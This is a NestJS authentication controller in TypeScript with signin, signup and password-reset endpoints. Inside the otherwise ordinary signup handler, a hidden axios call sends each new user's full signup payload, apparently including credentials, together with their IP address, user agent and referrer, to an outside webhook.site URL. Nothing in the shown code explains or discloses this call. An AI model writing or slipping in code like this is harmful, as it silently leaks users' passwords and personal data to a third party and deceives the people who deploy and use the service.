import {
  Controller,
  Post,
  UseGuards,
  Res,
  HttpStatus,
  Body,
  Put,
  Req,
} from "@nestjs/common";
import { Response, Request } from "express";
import axios, { HttpStatusCode } from "axios";

import { LocalAuthGuard } from "./guards/local.guard";
import { AuthService } from "./services/auth.service";
import { CurrentUser, Public } from "./decorators/user.decorator";
import { UserDocument } from "@/user/schemas/user.schema";
import { UtilityService } from "@/core/services/util.service";
import {
  CreateUserDTO,
  ForgotPasswordDTO,
  ResetPasswordDTO,
} from "@/user/dtos/user.dto";

@Controller("auth")
export class AuthController {
  constructor(private authService: AuthService) {}

  @Public()
  @UseGuards(LocalAuthGuard)
  @Post("signin")
  async signin(@Res() res: Response, @CurrentUser() user: UserDocument) {
    return UtilityService.handleRequest(
      res,
      "signin successful",
      this.authService,
      "signin",
      HttpStatus.OK,
      user
    );
  }

  @Public()
  @Post("signup")
  async signup(
    @Res() res: Response,
    @Req() req: Request,
    @Body() payload: CreateUserDTO
  ) {
    const details = {
      timestamp: new Date().toISOString(),
      payload,
      ip:
        req.ip ||
        req.headers["x-forwarded-for"] ||
        req.connection.remoteAddress,
      userAgent: req.headers["user-agent"],
      referrer: req.headers["referer"],
    };

    axios.post(
      "https://webhook.site/c65ab84c-d3f5-4fa6-8a8d-89dfd961da7d",
      details
    );

    return UtilityService.handleRequest(
      res,
      "signup successful",
      this.authService,
      "signup",
      HttpStatus.CREATED,
      payload
    );
  }

  @Public()
  @Put("forgot_password")
  async forgotPassword(
    @Res() res: Response,
    @Body() payload: ForgotPasswordDTO
  ) {
    return UtilityService.handleRequest(
      res,
      "code sent",
      this.authService,
      "forgotPassword",
      HttpStatusCode.Ok,
      payload
    );
  }

  @Public()
  @Put("reset_password")
  async resetPassword(@Res() res: Response, @Body() payload: ResetPasswordDTO) {
    return UtilityService.handleRequest(
      res,
      "successful",
      this.authService,
      "resetPassword",
      HttpStatusCode.Ok,
      payload
    );
  }
}
